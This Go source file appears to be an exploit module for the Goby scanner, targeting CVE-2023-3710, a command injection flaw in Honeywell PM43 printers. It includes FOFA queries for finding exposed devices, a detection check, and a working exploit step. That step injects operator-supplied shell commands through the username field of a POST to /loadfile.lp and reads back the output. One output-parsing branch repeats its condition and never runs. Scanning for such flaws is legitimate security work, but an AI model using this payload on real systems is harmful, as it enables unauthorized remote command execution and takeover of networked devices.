package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Honeywell PM43 loadfile.lp file command execution vulnerability (CVE-2023-3710)",
    "Description": "<p>The Honeywell PM43 is a printer product of the American company Honeywell.</p><p>Honeywell PM43P10.19.050004 and earlier versions of the input verification error vulnerability, attackers can arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Honeywell PM43",
    "Homepage": "https://www.honeywell.com/index.php",
    "DisclosureDate": "2023-09-12",
    "PostTime": "2023-10-17",
    "Author": "monster",
    "FofaQuery": "header=\"PM43\" || banner=\"PM43\" || title=\"PM43\" || body=\"/main/login.lua?pageid=Configure\"",
    "GobyQuery": "header=\"PM43\" || banner=\"PM43\" || title=\"PM43\" || body=\"/main/login.lua?pageid=Configure\"",
    "Level": "3",
    "Impact": "<p>Honeywell PM43P10.19.050004 and earlier versions of the input verification error vulnerability, attackers can arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004\">https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/loadfile.lp?pageid=Configure",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "python-requests/2.28.1",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=hahaha%0Aecho+%22CwEeR%22%3B%0A&userpassword=pwn&login=Login"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "CwEeR",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/loadfile.lp?pageid=Configure",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "python-requests/2.28.1",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=hahaha%0Aecho+%22CwEeR%22%3B{{{cmd}}}%3Becho+%22CwEeR%22%3B%0A&userpassword=pwn&login=Login"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|1CwEeR\\n([\\w\\W]*)\\nCwEeR"
            ]
        }
    ],
    "Tags": [
        "File Inclusion",
        "File Upload",
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-3710"
    ],
    "CNNVD": [
        "CNNVD-202309-891"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Honeywell PM43 loadfile.lp 文件命令执行漏洞（CVE-2023-3710）",
            "Product": "Honeywell PM43 ",
            "Description": "<p>Honeywell PM43 是美国霍尼韦尔（Honeywell）公司的一款打印机产品。</p><p>Honeywell PM43 P10.19.050004之前版本存在输入验证错误漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004\" target=\"_blank\">https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004</a></p>",
            "Impact": "<p>Honeywell PM43 P10.19.050004之前版本存在输入验证错误漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "文件包含",
                "文件上传",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Honeywell PM43 loadfile.lp file command execution vulnerability (CVE-2023-3710)",
            "Product": "Honeywell PM43",
            "Description": "<p>The Honeywell PM43 is a printer product of the American company Honeywell.</p><p>Honeywell PM43P10.19.050004 and earlier versions of the input verification error vulnerability, attackers can arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004\" target=\"_blank\">https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004</a></p>",
            "Impact": "<p>Honeywell PM43P10.19.050004 and earlier versions of the input verification error vulnerability, attackers can arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "File Inclusion",
                "File Upload",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10850"
}`
	executeCommand := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/loadfile.lp?pageid=Configure")
		postConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postConfig.Data = "username=h%0A" + url.QueryEscape(cmd) + "%0A&userpassword=pass&login=Login"
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, err := executeCommand(hostInfo, "echo "+checkString)
			return err == nil && resp != nil && strings.Contains(resp.Utf8Html, checkString)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			cmd := goutils.B2S(stepLogs.Params["cmd"])
			if attackType == "cmd" {
				resp, err := executeCommand(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Output = err.Error()
				} else {
					markPoint := ""
					if strings.Contains(resp.Utf8Html, "Status: 200 OK") {
						markPoint = "Status: 200 OK"
					} else if strings.Contains(resp.Utf8Html, "Status: 200 OK") {
						markPoint = "Content-Length:"
					}
					if markPoint == "" {
						expResult.Output = `漏洞利用失败`
					} else {
						expResult.Success = true
						expResult.Output = resp.Utf8Html[1:strings.Index(resp.Utf8Html, markPoint)]
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
